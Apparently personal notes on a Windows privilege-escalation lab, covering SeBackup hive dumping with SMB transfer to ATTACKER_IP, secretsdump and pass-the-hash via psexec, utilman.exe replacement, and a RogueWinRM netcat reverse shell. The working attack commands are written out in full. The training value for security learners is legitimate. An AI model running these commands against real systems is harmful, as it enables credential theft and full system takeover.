
---
# 🗄️ **SeBackup / SeRestore Privileges (Dumping SAM and SYSTEM hives)**


- **SeBackupPrivilege / SeRestorePrivilege**: These allow a user to **read** or **write** any file on the system (including protected files like the SAM and SYSTEM registry hives) **regardless of file permissions (DACLs)**.
    
- These privileges are typically assigned to **Backup Operators**, not Admins.
    
- An attacker can **extract password hashes** and **escalate privileges** by exploiting these.
    

---

### **1. Log in with a Low-Privileged User**

- Credentials:
    
    - **User:** THMBackup
        
    - **Password:** CopyMaster555
        
- This account is a member of **Backup Operators**, which has the required privileges, but they are **disabled by default**.
    

---

### **2. Open Command Prompt as Administrator**

- Even though THMBackup isn’t an admin, opening CMD "as administrator" is required to **enable** SeBackup/SeRestore privileges.
    
- You'll be prompted to re-enter the password.
    

✅ **Command**:  
Right-click Command Prompt → **"Run as Administrator"**

---

### **3. Confirm Assigned Privileges**

- Check active and available privileges with:
    

```bash
whoami /priv
```

- You’ll see SeBackupPrivilege and SeRestorePrivilege listed but **disabled**.
    
- These can still be used by system tools like `reg save`.
    

---

### **4. Dump SAM and SYSTEM Registry Hives**

- These hives store **password hashes** and **boot keys** necessary to extract them.
    

✅ **Commands**:

```bash
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```

- This works even without full admin because SeBackupPrivilege allows reading any file for backup purposes.
    

---

### **5. Transfer Files to Attacker Machine (via SMB)**

- On your **Kali Linux** AttackBox:
    
    - Create a folder and launch a **simple SMB server** with `impacket`:
        

```bash
mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```

- On Windows (victim), copy the hive files over the network to the attacker:
    

```bash
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

---

### **6. Extract Password Hashes from the Hives**

- Use `secretsdump.py` (from impacket) to dump hashes from SAM and SYSTEM:
    

```bash
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

🔓 This reveals:

```
Administrator:500:LMHASH:NTHASH:::
```

Example:

```
13a04cdcf3f7ec41264e568127c5ca94
```

← This is the **NT hash** of the Administrator account.

---

### **7. Perform Pass-the-Hash (PtH) Attack**

- Using the Administrator hash, we can now impersonate the account without knowing the actual password.
    

✅ **Command**:

```bash
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.57.193
```

- This runs a remote service (via SMB and RPC) and gives a SYSTEM-level shell on the victim machine.
    

---

### ✅ **Result**

You now have a shell as:

```bash
whoami
nt authority\system
```

This is **the highest privilege level** on Windows.

---
# 🔑 **SeTakeOwnership Privilege (Replacing utilman.exe)**

- **SeTakeOwnershipPrivilege** allows a user to **take ownership of any file, folder, or registry key** — even if they don’t have permission to access it.
    
- Once a user is the owner of a file, they can grant themselves permissions and **replace or modify** the file.
    
- In this case, we abuse this to replace `Utilman.exe` (a system binary that runs as SYSTEM) with `cmd.exe`, giving us a **SYSTEM-level shell**.
    
---

### **1. Log in to the Target Machine**

- **Username:** `THMTakeOwnership`
    
- **Password:** `TheWorldIsMine2022`
    
- Log in via **RDP** or similar remote desktop protocol.
    

---

### **2. Open Command Prompt as Administrator**

- Required to enable SeTakeOwnership privilege.
    
- Even though it shows as **disabled**, Windows will **automatically enable it** when used with certain system tools (like `takeown`).
    

✅ Action:  
Right-click CMD → **"Run as administrator"**  
Enter password when prompted.

---

### **3. Confirm Privileges**

```bash
whoami /priv
```

- Output shows:
    
    - `SeTakeOwnershipPrivilege` — _Disabled_, but available.
        
- Still usable via tools like `takeown` and `icacls`.
    

---

### **4. Target: `Utilman.exe`**

- Utilman.exe is launched from the **lock screen** via the “Ease of Access” button.
    
- It runs with **SYSTEM privileges**.
    
- Goal: Replace it with `cmd.exe` to gain a SYSTEM shell when the button is pressed.
    

---

### **5. Take Ownership of `Utilman.exe`**

```bash
takeown /f C:\Windows\System32\Utilman.exe
```

- Result:
    
    ```
    SUCCESS: The file (...) now owned by user "WINPRIVESC2\thmtakeownership".
    ```
    

🔑 Now you're the **owner** of the file.

---

### **6. Grant Yourself Full Permissions**

```bash
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

- `F` = Full control
    
- Ownership alone doesn’t grant access; this explicitly gives your user permission to modify the file.
    

---

### **7. Replace `Utilman.exe` with `cmd.exe`**

```bash
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

- This overwrites `utilman.exe` with `cmd.exe`, effectively replacing what is run when the Ease of Access button is clicked.
    

---

### **8. Trigger the SYSTEM Shell**

1. **Lock the screen**:  
    Start Menu → Click on your username → Lock
    
2. **Click “Ease of Access” icon** on the lock screen
    
3. A command prompt opens – **as SYSTEM** 🎉
    

```bash
whoami
nt authority\system
```

---

# 🛜 **SeImpersonate / SeAssignPrimaryToken (Using RogueWinRM)**

- **SeImpersonatePrivilege** and **SeAssignPrimaryTokenPrivilege** allow a process to "borrow" the security context (access token) of another user.
    
- These privileges are commonly found in **network-facing services** (like IIS or FTP).
    
- If an attacker compromises such a service, they can **impersonate SYSTEM** under the right conditions.

---

### 👩‍💻 Example: FTP Server

Imagine an **FTP server** is run by a user called `ftp`.

- When **Ann** logs in, the server needs to read **Ann's files**.
    
- But if the server uses its own "badge" (ftp), it might not have permission to read her files.
    
- Worse, it would need permission to **everyone's files**, which is insecure.
    
![[Pasted image 20250429153254.png]]

---

### ✅ Solution: Impersonation

- Instead of using its own badge, the FTP server borrows **Ann’s badge** for a bit.
    
- This way, it can read only her files—and the system handles permissions safely.
    
![[Pasted image 20250429153323.png]]

---

### 💀 Why This Is Dangerous for Security

If **an attacker** gets control of a process (like a web server) that can **impersonate**, they can:

1. Trick a SYSTEM-level service to connect.
    
2. "Wear" the SYSTEM user's badge.
    
3. **Do anything a SYSTEM user can do** (which is _everything_).
    

---

### 🧰 Real-Life Exploit: RogueWinRM

The **RogueWinRM** tool helps attackers do this:

1. The attacker runs a **fake Windows Remote Management (WinRM)** service.
    
2. They trigger a Windows service (called **BITS**) that **automatically connects as SYSTEM** to WinRM.
    
3. Because the attacker’s process can impersonate, they **steal SYSTEM’s badge**.
    
4. They use it to **open a SYSTEM-level reverse shell** (a way into the machine as the most powerful user).
    

---
### **1. Initial Foothold**

- You’ve already compromised a **web shell** running on a vulnerable IIS web server:
    
    ```
    http://10.10.57.193/
    ```
    
- This shell runs under the **application pool identity** (e.g., `iis apppool\defaultapppool`), which **has impersonation privileges**:
    
    ```
    SeImpersonatePrivilege
    SeAssignPrimaryTokenPrivilege
    ```
    

---

### **2. Upload and Locate RogueWinRM**

- The exploit `RogueWinRM.exe` is **already uploaded** to:
    
    ```
    C:\tools\RogueWinRM\RogueWinRM.exe
    ```
    
- **Netcat** (`nc64.exe`) is also present in the same folder for the reverse shell payload.
    

---

### **3. Start a Listener on the Attacker's Machine**

Before triggering the exploit, prepare your attack machine to **receive the reverse shell**:

```bash
nc -lvp 4442
```

- This listens on port `4442` for incoming connections.
    
- You'll receive a shell here once the exploit runs successfully.
    

---

### **4. Trigger the Exploit via Web Shell**

From the web shell interface on the target machine, run:

```bash
C:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

#### 🔍 Command Breakdown:

- `-p`: Path to the executable to run (Netcat in this case).
    
- `-a`: Arguments passed to the executable.
    
- `-e cmd.exe ATTACKER_IP 4442`: Tells Netcat to open a shell (`cmd.exe`) and send it back to your attack box on port 4442.
    

✅ **What this does**:

- Spawns a **fake WinRM (port 5985)** server on the target.
    
- When **BITS service** (Background Intelligent Transfer Service) starts, **it connects to port 5985 using SYSTEM privileges**.
    
- Since the process has SeImpersonate, it **steals the SYSTEM token** from that connection and **executes the Netcat reverse shell** using SYSTEM context.
    

---

### **5. Wait for Exploit Execution**

⏱ The exploit might take **1–2 minutes** because it needs the BITS service to restart.

- If the web shell freezes momentarily, that's normal.
    
- Behind the scenes, the system is connecting as SYSTEM to the fake service, triggering the impersonation.
    

---

### **6. Catch the SYSTEM Shell**

On your attack machine (from the listener window), you’ll see something like:

```bash
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version ...]
C:\windows\system32\inetsrv> whoami
nt authority\system
```

🎉 You now have a **SYSTEM-level shell** on the victim machine.

---

### **7. Gain Access to Administrator's Desktop**

Now that you have SYSTEM access:

- Navigate to the Administrator user’s Desktop:
    
    ```cmd
    cd C:\Users\Administrator\Desktop
    dir
    type flag.txt
    ```
    
- This reveals the **flag** (as instructed in the lab or exercise).
    

---
